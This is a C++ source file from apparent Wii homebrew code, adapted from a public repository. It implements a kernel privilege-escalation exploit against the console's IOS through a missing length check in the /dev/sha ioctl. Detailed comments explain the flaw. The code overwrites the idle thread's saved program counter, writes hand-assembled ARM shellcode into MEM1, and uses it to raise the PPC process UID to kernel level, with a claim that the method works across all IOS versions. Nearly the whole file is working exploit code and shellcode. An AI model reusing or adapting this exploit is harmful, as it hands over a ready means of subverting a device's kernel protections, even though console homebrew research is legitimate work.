// Based on https://github.com/mkwcat/wii-ios-exploits/blob/master/source/ios_exploit_sha.c
//
// Copyright (c) 2026 Palapeli
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:

// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.

// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.

#include "KernelUID.hh"

#include "cube/Clock.hh"
#include "cube/Memory.hh"
#include "cube/Platform.hh"
#include "cube/ios/File.hh"
#include "cube/ios/Resource.hh"

namespace IOS {

KernelUID::KernelUID(bool again) : m_ok(Acquire(again)) {}

KernelUID::~KernelUID() {
    if (m_ok) {
        Release();
    }
}

bool KernelUID::ok() const {
    return m_ok;
}

// Exploit summary:
//
// /dev/sha ioctl 0 (SHA-1 Init) writes to the context vector (1) without checking the length at
// all. If we pass a length of 0, the memory bounds check performed by the IOS kernel for all
// requests will not fail here.
//
// The SHA-1 Init call will then write the following words to the destination without any security
// checks:
//
// 00: 67452301
// 04: EFCDAB89
// 08: 98BADCFE
// 0C: 10325476
// 10: C3D2E1F0
// 14: 00000000
// 18: 00000000
//
// The zero words are useful here, because due to a flaw in the design of IOS, 0 and NULL always
// point to the beginning of MEM1, an area controlled by the PPC side. Most exploits utilize this by
// overwriting the LR on the stack to jump to the beginning of MEM1, but we can go a step further...
//
// For whatever reason the thread that handles /dev/sha runs in ARM system mode. This means that all
// kernel-only or read-only memory is now mapped as read/write. We can use this to instead attack
// the context of the idle thread, which is always located at 0xFFFE0000 in every version of IOS and
// also runs in system mode, making the exploit much more stable. This exploit works universally
// across all IOS versions.
bool KernelUID::Acquire(bool again) {
    if (Platform::IsDolphin()) {
        return true;
    }

    Resource sha("/dev/sha", Mode::None);
    if (!sha.ok()) {
        return false;
    }

    SafeFlush(ArmCode, sizeof(ArmCode));

    u32 *mem1 = Memory::PhysicalToCached<u32>(0x00000000);
    if (again) {
        // Enter Thumb state
        *mem1++ = 0xfaffffff; // blx 0x4
    }
    *mem1++ = 0x4903468d; // ldr r1, =0x10100000; mov sp, r1;
    *mem1++ = 0x49034788; // ldr r1, =entrypoint; blx r1;
    // Overwrite reserved handler to loop infinitely
    *mem1++ = 0x49036209; // ldr r1, =0xffff0014; str r1, [r1, #0x20];
    *mem1++ = 0x47080000; // bx r1
    *mem1++ = 0x10100000; // Temporary stack
    *mem1++ = Memory::CachedToPhysical(ArmCode);
    *mem1++ = 0xffff0014; // Reserved handler

    alignas(0x20) Resource::IoctlvPair pairs[4];
    pairs[0].data = nullptr;
    pairs[0].size = 0;
    // We want to write one of the 0 words to the stored PC at 0xFFFE0040, so here we subtract that
    // by 0x18, trashing various other registers that don't matter in the process. Note: if using
    // IOS_Ioctlv provided by the SDK instead of libogc, this address should be changed to
    // 0x7FFE0028 to account for the IPC library's address conversion.
    pairs[1].data = Memory::PhysicalToCached<void>(0x7ffe0028);
    pairs[1].size = 0;
    // This vector is unused by this specific call, so we will utilize it for invalidating the data
    // cache on the IOS side.
    pairs[2].data = Memory::PhysicalToCached<void>(0x00000000);
    pairs[2].size = 0x40;

    // The exploit realistically couldn't have run if the result is less than zero.
    if (sha.ioctlv(0, 1, 2, pairs) < 0) {
        return false;
    }

    while (ReadMessage(1) != 1) {
        Clock::WaitMilliseconds(1);
    }
    return true;
}

void KernelUID::Release() {
    if (Platform::IsDolphin()) {
        return;
    }

    WriteMessage(1, 2);
    while (ReadMessage(1) != 3) {
        Clock::WaitMilliseconds(1);
    }
}

void KernelUID::SafeFlush(const void *start, size_t size) {
    // The IPC function flushes the cache here on PPC, and then IOS invalidates its own cache.
    // Note: IOS doesn't check for the invalid fd before doing what we want.
    File file(-1);
    file.write(start, size);
}

#ifdef __CWCC__
u32 KernelUID::ReadMessage(u32 index) {
    u32 address = Memory::CachedToPhysical(&ArmCode[index]);
    u32 message;
    asm volatile("lwz %0, 0x0 (%1); sync" : "=r"(message) : "b"(0xc0000000 | address));
    return message;
}

void KernelUID::WriteMessage(u32 index, u32 message) {
    u32 address = Memory::CachedToPhysical(&ArmCode[index]);
    asm volatile("stw %0, 0x0 (%1); eieio" : : "r"(message), "b"(0xc0000000 | address));
}
#endif

u32 KernelUID::Syscall(u32 id) {
    return 0xe6000010 | id << 5;
}

// clang-format off
const u32 KernelUID::ArmCode[] = {
    /* 0x00 */ 0xea000000, // b       0x8
    /* 0x04 */ 0x00000000, // MESSAGE_VALUE
    // Set PPC UID to kernel
    /* 0x08 */ 0xe3a0000f, // mov     r0, #15
    /* 0x0C */ 0xe3a01000, // mov     r1, #0
    /* 0x10 */ Syscall(SC::IOS_SetUid),
    // Send response to PPC
    /* 0x14 */ 0xe24f0018, // adr     r0, MESSAGE_VALUE
    /* 0x18 */ 0xe3a01001, // mov     r1, #1
    /* 0x1C */ 0xe5801000, // str     r1, [r0]
    // Flush the response to main memory
    /* 0x20 */ 0xe3a01004, // mov     r1, #4
    /* 0x24 */ Syscall(SC::IOS_FlushDCache),
    // Wait for response back from PPC
    // loop_start:
    /* 0x28 */ 0xe24f002c, // adr     r0, MESSAGE_VALUE
    /* 0x2C */ 0xe5902000, // ldr     r2, [r0]
    /* 0x30 */ 0xe3520002, // cmp     r2, #2
    /* 0x34 */ 0x0a000001, // beq     loop_break
    /* 0x38 */ Syscall(SC::IOS_InvalidateDCache),
    /* 0x3C */ 0xeafffff9, // b       loop_start
    // loop_break:
    // Reset PPC UID back to 15
    /* 0x40 */ 0xe3a0000f, // mov     r0, #15
    /* 0x44 */ 0xe3a0100f, // mov     r1, #15
    /* 0x48 */ Syscall(SC::IOS_SetUid),
    // Send response to PPC
    /* 0x4C */ 0xe24f0050, // adr     r0, MESSAGE_VALUE
    /* 0x50 */ 0xe3a01003, // mov     r1, #3
    /* 0x54 */ 0xe5801000, // str     r1, [r0]
    // Flush the response to main memory
    /* 0x58 */ 0xe3a01004, // mov     r1, #4
    /* 0x5C */ Syscall(SC::IOS_FlushDCache),
    /* 0x60 */ 0xe12fff1e, // bx      lr
};
// clang-format on

} // namespace IOS
